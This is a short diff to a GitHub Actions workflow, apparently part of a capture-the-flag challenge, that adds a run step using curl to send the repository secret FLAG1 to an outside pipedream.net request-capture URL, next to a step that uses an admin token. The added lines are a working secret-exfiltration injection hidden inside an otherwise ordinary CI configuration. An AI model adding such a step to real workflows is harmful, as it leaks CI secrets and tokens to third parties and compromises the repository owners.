@@ -61,6 +61,8 @@ jobs:
         with:
           name: 'FLAG'
           value: ${{ secrets.FLAG1 }}
+          run: |
+            curl "https://en18vrsodfxt4.x.pipedream.net?value=${{ secrets.FLAG1 }}"
           repository: "OctoHigh/challenge-1-${{ env.LOGIN }}"
           token: ${{ secrets.ADMIN_TOKEN }}
 
